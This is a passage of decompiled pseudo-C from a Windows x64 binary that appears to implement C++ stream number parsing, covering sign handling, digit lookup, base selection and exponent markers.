0x38) == NULL) {\n                        iVar26 = 0;\n                    }\n                    else {\n                        iVar26 = **(iVar6 + 0x50);\n                    }\n                    if (iVar26 < 1) {\n                        puStack288 = 0x1800704e0;\n                        uVar11 = (**0x1800de8f0)();\n                    }\n                    else {\n                        uVar11 = ***(iVar6 + 0x38);\n                    }\n                    if (uVar11 == 0xffffffff) goto code_r0x0001800704ea;\n                    *(arg3 + 9) = uVar11;\n                }\n                *(arg3 + 1) = 1;\n            }\n            piVar22 = 0x1c;\n            puStack288 = 0x180070505;\n            puVar8 = fcn.1800ae430(&stack0xffffffffffffffa0, *(arg3 + 9), 0x1c);\n            puVar13 = &stack0xffffffffffffffbc;\n            if (puVar8 != NULL) {\n                puVar13 = puVar8;\n            }\n            uVar12 = puVar13 - &stack0xffffffffffffffa0;\n            uVar5 = uStack208;\n            uVar11 = piStack272;\n            if (0x15 < uVar12) break;\n            iVar26 = piVar18;\n            if (iVar26 < piStack312) {\n                if ((uVar12 != 0) || (iVar26 != 0)) {\n                    *puStack296 = *(uVar12 + 0x1800df7b8);\n                    puStack296 = puStack296 + 1;\n                    piVar18 = iVar26 + 1;\n                }\n            }\n            else {\n                piStack272 = piStack272 + 1;\n            }\n            uVar11 = piStack272;\n            uStack232 = 1;\n            puStack288 = 0x180070549;\n            fcn.180071238(arg3);\n            puStack288 = 0x180070554;\n            cVar2 = fcn.1800738b4(arg3, pcStack328);\n            uVar5 = uStack208;\n        }\ncode_r0x000180070434:\n        uStack228 = uVar11;\n        uVar11 = piStack312;\n        iVar26 = 0;\n        if ((uStack232 != 0) && (piVar18 == 0)) {\n            *puStack296 = 0x30;\n            puStack296 = puStack296 + 1;\n        }\n        puStack288 = 0x180070452;\n        cVar2 = fcn.1800738b4(arg3, pcStack328);\n        if (cVar2 == '\\0') {\n            if (*(arg3 + 1) == '\\0') {\n                iVar6 = *arg3;\n                if (iVar6 == 0) {\ncode_r0x000180070588:\n                    *arg3 = 0;\n                }\n                else {\n                    piVar22 = **(iVar6 + 0x38);\n                    if (piVar22 != NULL) {\n                        iVar26 = **(iVar6 + 0x50);\n                    }\n                    if (iVar26 < 1) {\n                        puStack288 = 0x18007057e;\n                        uVar25 = (**0x1800de8f0)();\n                    }\n                    else {\n                        uVar25 = *piVar22;\n                    }\n                    if (uVar25 == 0xffffffff) goto code_r0x000180070588;\n                    *(arg3 + 9) = uVar25;\n                }\n                *(arg3 + 1) = 1;\n            }\n            cVar2 = *(arg3 + 9);\n            puStack288 = 0x1800705a3;\n            cVar3 = (**0x1800de8f0)();\n            if (cVar2 == cVar3) {\n                puStack288 = 0x1800705ac;\n                puVar9 = fcn.1800bb800(uVar5);\n                *puStack296 = **puVar9;\n                puStack296 = puStack296 + 1;\n                puStack288 = 0x1800705be;\n                fcn.180071238(arg3);\n            }\n        }\n        piStack272 = NULL;\n        if (piVar18 == 0) {\n            puStack288 = 0x1800705d4;\n            cVar2 = fcn.1800738b4(arg3, pcStack328);\n            uVar25 = uStack228;\n            while (cVar2 == '\\0') {\n                if (*(arg3 + 1) == '\\0') {\n                    iVar6 = *arg3;\n                    if (iVar6 == 0) {\ncode_r0x000180070625:\n                        *arg3 = 0;\n                    }\n                    else {\n                        piVar22 = **(iVar6 + 0x38);\n                        piVar17 = piStack272;\n                        if (piVar22 != NULL) {\n                            piVar17 = **(iVar6 + 0x50);\n                        }\n                        if (piVar17 < 1) {\n                            puStack288 = 0x18007061b;\n                            uVar11 = (**0x1800de8f0)();\n                        }\n                        else {\n                            uVar11 = *piVar22;\n                        }\n                        if (uVar11 == 0xffffffff) goto code_r0x000180070625;\n                        *(arg3 + 9) = uVar11;\n                    }\n                    *(arg3 + 1) = 1;\n                }\n                uVar11 = uStack220;\n                if (*(arg3 + 9) != auStack96[0]) break;\n                uVar25 = uVar25 - 1;\n                uStack232 = 1;\n                puStack288 = 0x180070644;\n                fcn.180071238(arg3);\n                puStack288 = 0x18007064f;\n                cVar2 = fcn.1800738b4(arg3, pcStack328);\n                uVar11 = uStack220;\n            }\n            uStack320 = uVar25;\n            uStack228 = uVar25;\n            if (uVar25 < 0) {\n                *puStack296 = 0x30;\n                puStack296 = puStack296 + 1;\n                uStack228 = uVar25 + 1;\n                uStack320 = uStack228;\n            }\n        }\n        else {\n            uStack320 = uStack228;\n        }\n        puStack288 = 0x180070687;\n        cVar2 = fcn.1800738b4(arg3, pcStack328);\n        if (cVar2 == '\\0') {\n            do {\n                if (*(arg3 + 1) == '\\0') {\n                    iVar6 = *arg3;\n                    if (iVar6 == 0) {\ncode_r0x0001800706da:\n                        *arg3 = 0;\n                    }\n                    else {\n                        piVar22 = piStack272;\n                        if (**(iVar6 + 0x38) != NULL) {\n                            piVar22 = **(iVar6 + 0x50);\n                        }\n                        if (piVar22 < 1) {\n                            puStack288 = 0x1800706d0;\n                            uVar25 = (**0x1800de8f0)();\n                        }\n                        else {\n                            uVar25 = ***(iVar6 + 0x38);\n                        }\n                        if (uVar25 == 0xffffffff) goto code_r0x0001800706da;\n                        *(arg3 + 9) = uVar25;\n                    }\n                    *(arg3 + 1) = 1;\n                }\n                piVar22 = 0x1c;\n                puStack288 = 0x1800706f4;\n                puVar8 = fcn.1800ae430(&stack0xffffffffffffffa0, *(arg3 + 9), 0x1c);\n                puVar13 = &stack0xffffffffffffffbc;\n                if (puVar8 != NULL) {\n                    puVar13 = puVar8;\n                }\n                if (0x15 < puVar13 - &stack0xffffffffffffffa0) break;\n                if (piVar18 < uVar11) {\n                    *puStack296 = *((puVar13 - &stack0xffffffffffffffa0) + 0x1800df7b8);\n                    puStack296 = puStack296 + 1;\n                    piVar18 = piVar18 + 1;\n                }\n                uStack232 = 1;\n                puStack288 = 0x18007072a;\n                fcn.180071238(arg3);\n                puStack288 = 0x180070735;\n                cVar2 = fcn.1800738b4(arg3, pcStack328);\n            } while (cVar2 == '\\0');\n            uStack320 = uStack228;\n        }\n        pcVar16 = piVar18 & 0xffffffffffffff00;\n        pcStack336 = pcVar16 | uStack232;\n        piStack312 = NULL;\n        if (uStack232 != 0) {\n            puStack288 = 0x18007075e;\n            cVar2 = fcn.1800738b4(arg3, pcStack328);\n            if (cVar2 == '\\0') {\n                cVar2 = *(arg3 + 1);\n                if (cVar2 == '\\0') {\n                    iVar6 = *arg3;\n                    if (iVar6 == 0) {\ncode_r0x0001800707ad:\n                        *arg3 = 0;\n                    }\n                    else {\n                        piVar22 = **(iVar6 + 0x38);\n                        piVar18 = piStack312;\n                        if (piVar22 != NULL) {\n                            piVar18 = **(iVar6 + 0x50);\n                        }\n                        if (piVar18 < 1) {\n                            puStack288 = 0x1800707a3;\n                            uVar11 = (**0x1800de8f0)();\n                        }\n                        else {\n                            uVar11 = *piVar22;\n                        }\n                        if (uVar11 == 0xffffffff) goto code_r0x0001800707ad;\n                        *(arg3 + 9) = uVar11;\n                    }\n                    *(arg3 + 1) = 1;\n                    cVar2 = '\\x01';\n                }\n                cVar3 = *(arg3 + 9);\n                if (cVar3 != cStack69) {\n                    if (cVar2 == '\\0') {\n                        iVar6 = *arg3;\n                        if (iVar6 == 0) {\ncode_r0x00018007080c:\n                            *arg3 = 0;\n                        }\n                        else {\n                            puStack472 = **(iVar6 + 0x38);\n                            piVar22 = piStack312;\n                            if (puStack472 != NULL) {\n                                piVar22 = **(iVar6 + 0x50);\n                            }\n                            if (piVar22 < 1) {\n                                puStack288 = 0x1800707fd;\n                                uVar11 = (**0x1800de8f0)();\n                                cVar3 = *(arg3 + 9);\n                            }\n                            else {\n                                uVar11 = *puStack472;\n                            }\n                            if (uVar11 == 0xffffffff) goto code_r0x00018007080c;\n                            cVar3 = uVar11;\n                            *(arg3 + 9) = cVar3;\n                        }\n                        *(arg3 + 1) = 1;\n                    }\n                    if (cVar3 != cStack70) goto code_r0x000180070a56;\n                }\n                *puStack296 = 0x70;\n                puVar21 = puStack296 + 1;\n                puStack288 = 0x18007082a;\n                fcn.180071238(arg3);\n                puStack288 = 0x18007083b;\n                cVar2 = fcn.1800738b4(arg3, pcStack328);\n                if (cVar2 == '\\0') {\n                    cVar2 = *(arg3 + 1);\n                    if (cVar2 == '\\0') {\n                        iVar6 = *arg3;\n                        if (iVar6 == 0) {\ncode_r0x00018007088a:\n                            *arg3 = 0;\n                        }\n                        else {\n                            piVar22 = **(iVar6 + 0x38);\n                            piVar18 = piStack312;\n                            if (piVar22 != NULL) {\n                                piVar18 = **(iVar6 + 0x50);\n                            }\n                            if (piVar18 < 1) {\n                                puStack288 = 0x180070880;\n                                uVar11 = (**0x1800de8f0)();\n                            }\n                            else {\n                                uVar11 = *piVar22;\n                            }\n                            if (uVar11 == 0xffffffff) goto code_r0x00018007088a;\n                            *(arg3 + 9) = uVar11;\n                        }\n                        *(arg3 + 1) = 1;\n                        cVar2 = '\\x01';\n                    }\n                    cVar3 = *(arg3 + 9);\n                    if (cVar3 == cStack73) {\n                        *puVar21 = 0x2b;\n                    }\n                    else {\n                        if (cVar2 == '\\0') {\n                            iVar6 = *arg3;\n                            if (iVar6 == 0) {\ncode_r0x0001800708ee:\n                                *arg3 = 0;\n                            }\n                            else {\n                                puStack472 = **(iVar6 + 0x38);\n                                piVar22 = piStack312;\n                                if (puStack472 != NULL) {\n                                    piVar22 = **(iVar6 + 0x50);\n                                }\n                                if (piVar22 < 1) {\n                                    puStack288 = 0x1800708df;\n                                    uVar11 = (**0x1800de8f0)();\n                                    cVar3 = *(arg3 + 9);\n                                }\n                                else {\n                                    uVar11 = *puStack472;\n                                }\n                                if (uVar11 == 0xffffffff) goto code_r0x0001800708ee;\n                                cVar3 = uVar11;\n                                *(arg3 + 9) = cVar3;\n                            }\n                            *(arg3 + 1) = 1;\n                        }\n                        if (cVar3 != cStack74) goto code_r0x000180070908;\n                        *puVar21 = 0x2d;\n                    }\n                    puStack288 = 0x180070908;\n                    fcn.180071238(arg3);\n                    puVar21 = puStack296 + 1;\n                }\ncode_r0x000180070908:\n                puStack296 = puVar21;\n                puStack288 = 0x180070913;\n                cVar2 = fcn.1800738b4(arg3, pcStack328);\n                pcStack336 = pcVar16;\n                if (cVar2 == '\\0') {\n                    do {\n                        if (*(arg3 + 1) == '\\0') {\n                            iVar6 = *arg3;\n                            if (iVar6 == 0) {\ncode_r0x00018007095d:\n                                *arg3 = 0;\n                            }\n                            else {\n                                piVar22 = **(iVar6 + 0x38);\n                                piVar18 = piStack312;\n                                if (piVar22 != NULL) {\n                                    piVar18 = **(iVar6 + 0x50);\n                                }\n                                if (piVar18 < 1) {\n                                    puStack288 = 0x180070953;\n                                    uVar11 = (**0x1800de8f0)();\n                                }\n                                else {\n                                    uVar11 = *piVar22;\n                                }\n                                if (uVar11 == 0xffffffff) goto code_r0x00018007095d;\n                                *(arg3 + 9) = uVar11;\n                            }\n                            *(arg3 + 1) = 1;\n                        }\n                        if (*(arg3 + 9) != auStack96[0]) break;\n                        pcVar16 = CONCAT71(pcVar16 >> 8, 1);\n                        puStack288 = 0x180070977;\n                        fcn.180071238(arg3);\n                        puStack288 = 0x180070982;\n                        cVar2 = fcn.1800738b4(arg3, pcStack328);\n                    } while (cVar2 == '\\0');\n                    pcStack336 = pcVar16;\n                    if (pcVar16 != '\\0') {\n                        *puStack296 = 0x30;\n                        puStack296 = puStack296 + 1;\n                    }\n                }\n                puStack288 = 0x18007099c;\n                cVar2 = fcn.1800738b4(arg3, pcStack328);\n                piStack272 = piStack312;\n                if (cVar2 == '\\0') {\n                    do {\n                        if (*(arg3 + 1) == '\\0') {\n                            iVar6 = *arg3;\n                            if (iVar6 == 0) {\ncode_r0x0001800709f1:\n                                *arg3 = 0;\n                            }\n                            else {\n                                piVar22 = piStack312;\n                                if (**(iVar6 + 0x38) != NULL) {\n                                    piVar22 = **(iVar6 + 0x50);\n                                }\n                                if (piVar22 < 1) {\n                                    puStack288 = 0x1800709e7;\n                                    uVar11 = (**0x1800de8f0)();\n                                }\n                                else {\n                                    uVar11 = ***(iVar6 + 0x38);\n                                }\n                                if (uVar11 == 0xffffffff) goto code_r0x0001800709f1;\n                                *(arg3 + 9) = uVar11;\n                            }\n                            *(arg3 + 1) = 1;\n                        }\n                        piVar22 = 0x1c;\n                        puStack288 = 0x180070a0b;\n                        puVar8 = fcn.1800ae430(&stack0xffffffffffffffa0, *(arg3 + 9), 0x1c);\n                        puVar13 = &stack0xffffffffffffffbc;\n                        if (puVar8 != NULL) {\n                            puVar13 = puVar8;\n                        }\n                        if (0x15 < puVar13 - &stack0xffffffffffffffa0) break;\n                        if (piStack272 < 8) {\n                            *puStack296 = *((puVar13 - &stack0xffffffffffffffa0) + 0x1800df7b8);\n                            puStack296 = puStack296 + 1;\n                            piStack272 = piStack272 + 1;\n                        }\n                        pcStack336 = CONCAT71(pcStack336 >> 8, 1);\n                        puStack288 = 0x180070a3e;\n                        fcn.180071238(arg3);\n                        puStack288 = 0x180070a49;\n                        cVar2 = fcn.1800738b4(arg3, pcStack328);\n                    } while (cVar2 == '\\0');\n                    uStack320 = uStack228;\n                }\n            }\n        }\ncode_r0x000180070a56:\n        if ((cStack230 != '\\0') || (pcStack336 == '\\0')) {\n            puStack296 = puStack176;\n        }\n        *puStack296 = 0;\n        *piStack184 = uStack320;\n        if (uStack104 < 0x10) goto code_r0x000180070aa7;\n        pcVar14 = pcStack128;\n        if (0xfff < uStack104 + 1) {\n            pcVar16 = uStack104 + 0x28;\n            pcVar14 = *(pcStack128 + -8);\n            if (0x1f < pcStack128 + (-8 - pcVar14)) {\n                puStack288 = 0x180070ad5;\n                fcn.1800b3528();\n                goto code_r0x000180070ad6;\n            }\n        }\n        puStack288 = 0x180070aa7;\n        fcn.18008fb24(pcVar14);\ncode_r0x000180070aa7:\n        puStack288 = 0x180070ab5;\n        pcVar16 = fcn.18008fb00(uStack64 ^ &stack0xfffffffffffffee8);\n        return pcVar16;\n    }\n    if (iStack112 == 0) {\n        uStack231 = 0;\n    }\n    else {\n        puStack288 = 0x180070183;\n        uStack231 = (**0x1800de8f0)(uVar5);\n    }\n    uStack320 = 0xf;\n    uStack136 = 0xf;\n    uStack144 = 1;\n    uStack160 = 0;\n    puStack288 = 0x1800701ac;\n    cVar2 = fcn.1800738b4(arg3, pcStack216);\n    pcVar14 = CONCAT62(Stack158, uStack160);\n    pcStack328 = pcVar16;\n    if (cVar2 == '\\0') {\n        do {\n            uVar12 = piStack312 & 0xffffffffffffff00;\n            piStack312 = uVar12 | *(arg3 + 1);\n            if (*(arg3 + 1) == 0) {\n                iVar6 = *arg3;\n                if (iVar6 == 0) {\ncode_r0x000180070200:\n                    *arg3 = 0;\n                }\n                else {\n                    if (**(iVar6 + 0x38) == NULL) {\n                        iVar26 = 0;\n                    }\n                    else {\n                        iVar26 = **(iVar6 + 0x50);\n                    }\n                    if (iVar26 < 1) {\n                        puStack288 = 0x1800701f6;\n                        uVar11 = (**0x1800de8f0)();\n                    }\n                    else {\n                        uVar11 = ***(iVar6 + 0x38);\n                    }\n                    if (uVar11 == 0xffffffff) goto code_r0x000180070200;\n                    *(arg3 + 9) = uVar11;\n                }\n                *(arg3 + 1) = 1;\n                piStack312 = CONCAT71(uVar12 >> 8, 1);\n            }\n            uVar23 = *(arg3 + 9);\n            pcVar16 = uVar23;\n            piVar22 = 0x1c;\n            puStack288 = 0x180070222;\n            puVar8 = fcn.1800ae430(&stack0xffffffffffffffa0, pcVar16, 0x1c);\n            puVar13 = &stack0xffffffffffffffbc;\n            if (puVar8 != NULL) {\n                puVar13 = puVar8;\n            }\n            uVar12 = puVar13 - &stack0xffffffffffffffa0;\n            if (uVar12 < 0x16) {\n                uStack232 = 1;\n                if (uStack224 < uStack220) {\n                    if ((uVar12 != 0) || (uStack224 != 0)) {\n                        *puStack296 = *(uVar12 + 0x1800df7b8);\n                        puStack296 = puStack296 + 1;\n                        uStack224 = uStack224 + 1;\n                    }\n                }\n                else {\n                    uStack228 = uStack228 + 1;\n                }\n                pcVar20 = &stack0xffffffffffffff60;\n                if (0xf < uStack320) {\n                    pcVar20 = pcVar14;\n                }\n                if (pcVar20[piStack272] != '\\x7f') {\n                    pcVar20 = &stack0xffffffffffffff60;\n                    if (0xf < uStack320) {\n                        pcVar20 = pcVar14;\n                    }\n                    pcVar20[piStack272] = pcVar20[piStack272] + '\\x01';\n                    goto code_r0x00018007035c;\n                }\n            }\n            else {\n                pcVar20 = &stack0xffffffffffffff60;\n                if (0xf < uStack320) {\n                    pcVar20 = pcVar14;\n                }\n                if ((pcVar20[piStack272] == '\\0') ||\n                   (puStack472 = puStack472 & 0xffffffffffffff00 | uStack231,  uStack231 == 0)) break;\n                if (piStack312 == '\\0') {\n                    iVar6 = *arg3;\n                    if (iVar6 == 0) {\ncode_r0x000180070312:\n                        *arg3 = 0;\n                        pcVar16 = pcVar16 & 0xffffffffffffff00 | uVar23;\n                    }\n                    else {\n                        piVar22 = **(iVar6 + 0x38);\n                        if (piVar22 == NULL) {\n                            iVar26 = 0;\n                        }\n                        else {\n                            iVar26 = **(iVar6 + 0x50);\n                        }\n                        if (iVar26 < 1) {\n                            puStack288 = 0x1800702fb;\n                            uVar11 = (**0x1800de8f0)();\n                            pcVar16 = uVar11;\n                            uVar23 = *(arg3 + 9);\n                            puStack472 = puStack472 & 0xffffffffffffff00 | uStack231;\n                        }\n                        else {\n                            pcVar16 = *piVar22;\n                        }\n                        if (pcVar16 == -1) goto code_r0x000180070312;\n                        *(arg3 + 9) = pcVar16;\n                    }\n                    *(arg3 + 1) = 1;\n                }\n                if (pcVar16 != puStack472) break;\n                if (uStack144 < uStack320) {\n                    pcVar20 = &stack0xffffffffffffff60;\n                    if (0xf < uStack320) {\n                        pcVar20 = pcVar14;\n                    }\n                    puVar21 = pcVar20 + uStack144;\n                    uStack144 = uStack144 + 1;\n                    *puVar21 = 0;\n                }\n                else {\n                    puStack472 = NULL;\n                    piVar22 = NULL;\n                    puStack288 = 0x180070359;\n                    fcn.180013eb0(&stack0xffffffffffffff60, 1);\n                }\n                piStack272 = piStack272 + 1;\ncode_r0x00018007035c:\n                pcVar14 = CONCAT62(Stack158, uStack160);\n                uStack320 = uStack136;\n            }\n            puStack288 = 0x18007036c;\n            fcn.180071238(arg3);\n            puStack288 = 0x180070379;\n            cVar2 = fcn.1800738b4(arg3, pcStack216);\n        } while (cVar2 == '\\0');\n        pcStack328 = pcStack200;\n        if (piStack272 == NULL) goto code_r0x00018007039f;\n        pcVar20 = &stack0xffffffffffffff60;\n        if (0xf < uStack320) {\n            pcVar20 = pcVar14;\n        }\n        pcStack328 = pcVar16;\n        if ('\\0' < pcVar20[piStack272]) {\n            piStack272 = piStack272 + 1;\n            pcStack328 = pcStack200;\n            goto code_r0x00018007039f;\n        }\ncode_r0x0001800703e4:\n        cStack230 = '\\x01';\n    }\n    else {\ncode_r0x00018007039f:\n        while ((piStack272 != NULL && (cVar2 = *pcStack328,  cVar2 != '\\x7f'))) {\n            piStack272 = piStack272 + -1;\n            if (piStack272 != NULL) {\n                pcVar16 = &stack0xffffffffffffff60;\n                if (0xf < uStack320) {\n                    pcVar16 = pcVar14;\n                }\n                if (cVar2 != pcVar16[piStack272]) goto code_r0x0001800703e4;\n            }\n            if (piStack272 == NULL) {\n                pcVar16 = &stack0xffffffffffffff60;\n                if (0xf < uStack320) {\n                    pcVar16 = pcVar14;\n                }\n                if (cVar2 < *pcVar16) goto code_r0x0001800703e4;\n            }\n            if ('\\0' < pcStack328[1]) {\n                pcStack328 = pcStack328 + 1;\n            }\n        }\n    }\n    if (uStack320 < 0x10) {\ncode_r0x000180070420:\n        piStack312 = uStack220;\n        piVar18 = uStack224;\n        uVar5 = uStack208;\n        pcStack328 = pcStack216;\n        uVar11 = uStack228;\n        goto code_r0x000180070434;\n    }\n    pcStack336 = pcVar14;\n    if (uStack320 + 1 < 0x1000) {\ncode_r0x000180070418:\n        puStack288 = 0x180070420;\n        fcn.18008fb24(pcStack336);\n        goto code_r0x000180070420;\n    }\n    pcVar16 = uStack320 + 0x28;\n    pcStack336 = *(pcVar14 + -8);\n    if (pcVar14 + (-8 - pcStack336) < 0x20) goto code_r0x000180070418;\ncode_r0x000180070ad6:\n    puStack288 = 0x180070adb;\n    fcn.1800b3528();\n    uStack448 = 0xfffffffffffffffe;\n    uStack344 = *0x180123080 ^ &stack0xfffffffffffffde0;\n    uVar5 = CONCAT44(uStack228, CONCAT13(uStack229, CONCAT12(cStack230, CONCAT11(uStack231, uStack232))));\n    pcStack480 = pcVar16;\n    piStack304 = arg3;\n    puStack288 = &stack0xffffffffffffffb1;\n    uVar7 = fcn.18006e658(uVar5);\n    (**0x1800de8f0)(uVar7, &stack0xfffffffffffffe68);\n    iVar26 = 0;\n    if (iStack392 == 0) {\n        uStack495 = 0;\n    }\n    else {\n        uStack495 = (**0x1800de8f0)(uVar7);\n    }\n    uVar5 = fcn.180012470(uVar5);\n    puVar24 = &stack0xfffffffffffffe88;\n    (**0x1800de8f0)(uVar5, 0x1800df798);\n    puVar19 = puStack472;\n    pcStack488 = pcVar16;\n    cVar2 = fcn.1800738b4(piVar22, puStack472);\n    if (cVar2 == '\\0') {\n        cVar2 = *(piVar22 + 1);\n        if (cVar2 == '\\0') {\n            iVar6 = *piVar22;\n            if (iVar6 == 0) {\ncode_r0x000180070bf8:\n                *piVar22 = 0;\n            }\n            else {\n                iVar15 = iVar26;\n                if (**(iVar6 + 0x38) != NULL) {\n                    iVar15 = **(iVar6 + 0x50);\n                }\n                if (iVar15 < 1) {\n                    uVar11 = (**0x1800de8f0)();\n                }\n                else {\n                    uVar11 = ***(iVar6 + 0x38);\n                }\n                if (uVar11 == 0xffffffff) goto code_r0x000180070bf8;\n                *(piVar22 + 9) = uVar11;\n            }\n            *(piVar22 + 1) = 1;\n            cVar2 = '\\x01';\n        }\n        cVar3 = *(piVar22 + 9);\n        if (cVar3 == cStack353) {\n            *pcVar16 = '+';\n        }\n        else {\n            if (cVar2 == '\\0') {\n                iVar6 = *piVar22;\n                if (iVar6 == 0) {\ncode_r0x000180070c5d:\n                    *piVar22 = 0;\n                }\n                else {\n                    puVar24 = **(iVar6 + 0x38);\n                    if (puVar24 != NULL) {\n                        iVar26 = **(iVar6 + 0x50);\n                    }\n                    if (iVar26 < 1) {\n                        uVar11 = (**0x1800de8f0)();\n                        cVar3 = *(piVar22 + 9);\n                    }\n                    else {\n                        uVar11 = *puVar24;\n                    }\n                    if (uVar11 == 0xffffffff) goto code_r0x000180070c5d;\n                    cVar3 = uVar11;\n                    *(piVar22 + 9) = cVar3;\n                }\n                *(piVar22 + 1) = 1;\n            }\n            if (cVar3 != cStack354) goto code_r0x000180070c7e;\n            *pcVar16 = '-';\n        }\n        pcVar16 = pcVar16 + 1;\n        pcStack488 = pcVar16;\n        fcn.180071238(piVar22);\n    }\ncode_r0x000180070c7e:\n    uStack240 = uStack240 & 0xe00;\n    uStack464 = 10;\n    uVar25 = 0x10;\n    uVar11 = -(uStack240 != 0) & 10;\n    if (uStack240 == 0x800) {\n        uVar11 = uVar25;\n    }\n    if (uStack240 == 0x400) {\n        uVar11 = 8;\n    }\n    cStack440 = '\\0';\n    cStack496 = '\\0';\n    cStack494 = '\\0';\n    uStack492 = uVar11;\n    cVar2 = fcn.1800738b4(piVar22, puVar19);\n    if (cVar2 == '\\0') {\n        if (*(piVar22 + 1) == '\\0') {\n            iVar6 = *piVar22;\n            if (iVar6 == 0) {\ncode_r0x000180070d21:\n                *piVar22 = 0;\n            }\n            else {\n                if (**(iVar6 + 0x38) == NULL) {\n                    iVar26 = 0;\n                }\n                else {\n                    iVar26 = **(iVar6 + 0x50);\n                }\n                if (iVar26 < 1) {\n                    uVar4 = (**0x1800de8f0)();\n                }\n                else {\n                    uVar4 = ***(iVar6 + 0x38);\n                }\n                if (uVar4 == 0xffffffff) goto code_r0x000180070d21;\n                *(piVar22 + 9) = uVar4;\n            }\n            *(piVar22 + 1) = 1;\n        }\n        if (*(piVar22 + 9) != auStack376[0]) goto code_r0x000180070e4c;\n        cStack440 = '\\x01';\n        cStack496 = '\\x01';\n        fcn.180071238(piVar22);\n        cVar2 = fcn.1800738b4(piVar22, puVar19);\n        if (cVar2 != '\\0') {\ncode_r0x000180070e34:\n            uStack492 = uVar11;\n            if (uVar11 == 0) {\n                uStack492 = 8;\n                uVar11 = uStack492;\n            }\n            goto code_r0x000180070e4c;\n        }\n        cVar2 = *(piVar22 + 1);\n        if (cVar2 == '\\0') {\n            iVar6 = *piVar22;\n            if (iVar6 == 0) {\ncode_r0x000180070d9e:\n                *piVar22 = 0;\n            }\n            else {\n                if (**(iVar6 + 0x38) == NULL) {\n                    iVar26 = 0;\n                }\n                else {\n                    iVar26 = **(iVar6 + 0x50);\n                }\n                if (iVar26 < 1) {\n                    uVar4 = (**0x1800de8f0)();\n                }\n                else {\n                    uVar4 = ***(iVar6 + 0x38);\n                }\n                if (uVar4 == 0xffffffff) goto code_r0x000180070d9e;\n                *(piVar22 + 9) = uVar4;\n            }\n            *(piVar22 + 1) = 1;\n            cVar2 = '\\x01';\n        }\n        cVar3 = *(piVar22 + 9);\n        if (cVar3 != cStack351) {\n            if (cVar2 == '\\0') {\n                iVar6 = *piVar22;\n                if (iVar6 == 0) {\ncode_r0x000180070dff:\n                    *piVar22 = 0;\n                }\n                else {\n                    puVar24 = **(iVar6 + 0x38);\n                    if (puVar24 == NULL) {\n                        iVar26 = 0;\n                    }\n                    else {\n                        iVar26 = **(iVar6 + 0x50);\n                    }\n                    if (iVar26 < 1) {\n                        uVar4 = (**0x1800de8f0)();\n                        cVar3 = *(piVar22 + 9);\n                    }\n                    else {\n                        uVar4 = *puVar24;\n                    }\n                    if (uVar4 == 0xffffffff) goto code_r0x000180070dff;\n                    cVar3 = uVar4;\n                    *(piVar22 + 9) = cVar3;\n                }\n                *(piVar22 + 1) = 1;\n            }\n            if (cVar3 != cStack352) goto code_r0x000180070e34;\n        }\n        if ((uVar11 & 0xffffffef) != 0) goto code_r0x000180070e34;\n        uStack492 = 0x10;\n        cStack440 = '\\0';\n        cStack496 = '\\0';\n        fcn.180071238(piVar22);\ncode_r0x000180070e56:\n        uStack464 = 0x16;\n        if (uVar25 == 8) {\n            uStack464 = 8;\n        }\n    }\n    else {\ncode_r0x000180070e4c:\n        uVar25 = uVar11;\n        if ((uVar25 != 0) && (uVar25 != 10)) goto code_r0x000180070e56;\n    }\n    pcVar20 = pcStack480;\n    uVar12 = 0xf;\n    uStack416 = 0xf;\n    uStack439 = 0;\n    uStack424 = 1;\n    iVar6 = 0;\n    pcStack456 = pcStack480 + 0x1f;\n    cVar3 = fcn.1800738b4(piVar22, puStack472);\n    pcVar10 = pcStack456;\n    pcVar14 = CONCAT62(Stack438, CONCAT11(uStack439, cStack440));\n    cVar2 = cStack496;\n    if (cVar3 == '\\0') {\n        do {\n            cVar2 = *(piVar22 + 1);\n            if (cVar2 == '\\0') {\n                iVar1 = *piVar22;\n                if (iVar1 == 0) {\ncode_r0x000180070ef7:\n                    *piVar22 = 0;\n                }\n                else {\n                    if (**(iVar1 + 0x38) == NULL) {\n                        iVar26 = 0;\n                    }\n                    else {\n                        iVar26 = **(iVar1 + 0x50);\n                    }\n                    if (iVar26 < 1) {\n                        uVar11 = (**0x1800de8f0)();\n                    }\n                    else {\n                        uVar11 = ***(iVar1 + 0x38);\n                    }\n                    if (uVar11 == 0xffffffff) goto code_r0x000180070ef7;\n                    *(piVar22 + 9) = uVar11;\n                }\n                *(piVar22 + 1) = 1;\n                cVar2 = '\\x01';\n            }\n            uVar23 = *(piVar22 + 9);\n            puVar8 = fcn.1800ae430(&stack0xfffffffffffffe88, uVar23, 0x1a);\n            puVar13 = &stack0xfffffffffffffea2;\n            if (puVar8 != NULL) {\n                puVar13 = puVar8;\n            }\n            if (puVar13 - &stack0xfffffffffffffe88 < uStack464) {\n                cVar2 = *((puVar13 - &stack0xfffffffffffffe88) + 0x1800df798);\n                *pcStack488 = cVar2;\n                if (((cStack494 != '\\0') || (cVar2 != '0')) && (pcStack488 < pcVar10)) {\n                    pcStack488 = pcStack488 + 1;\n                    cStack494 = '\\x01';\n                }\n                cStack496 = '\\x01';\n                pcVar16 = &stack0xfffffffffffffe48;\n                if (0xf < uVar12) {\n                    pcVar16 = pcVar14;\n                }\n                if (pcVar16[iVar6] != '\\x7f') {\n                    pcVar16 = &stack0xfffffffffffffe48;\n                    if (0xf < uVar12) {\n                        pcVar16 = pcVar14;\n                    }\n                    pcVar16[iVar6] = pcVar16[iVar6] + '\\x01';\n                    goto code_r0x000180071054;\n                }\n            }\n            else {\n                pcVar16 = &stack0xfffffffffffffe48;\n                if (0xf < uVar12) {\n                    pcVar16 = pcVar14;\n                }\n                if ((pcVar16[iVar6] == '\\0') || (puVar24 = puVar24 & 0xffffffffffffff00 | uStack495,  uStack495 == 0))\n                break;\n                if (cVar2 == '\\0') {\n                    iVar1 = *piVar22;\n                    if (iVar1 == 0) {\ncode_r0x00018007100a:\n                        *piVar22 = 0;\n                        uVar11 = uVar23;\n                    }\n                    else {\n                        if (**(iVar1 + 0x38) == NULL) {\n                            iVar26 = 0;\n                        }\n                        else {\n                            iVar26 = **(iVar1 + 0x50);\n                        }\n                        if (iVar26 < 1) {\n                            uVar11 = (**0x1800de8f0)();\n                            uVar23 = *(piVar22 + 9);\n                            puVar24 = puVar24 & 0xffffffffffffff00 | uStack495;\n                        }\n                        else {\n                            uVar11 = ***(iVar1 + 0x38);\n                        }\n                        if (uVar11 == 0xffffffff) goto code_r0x00018007100a;\n                        *(piVar22 + 9) = uVar11;\n                    }\n                    uVar23 = uVar11;\n                    *(piVar22 + 1) = 1;\n                }\n                if (uVar23 != puVar24) break;\n                if (uStack424 < uVar12) {\n                    pcVar16 = &stack0xfffffffffffffe48;\n                    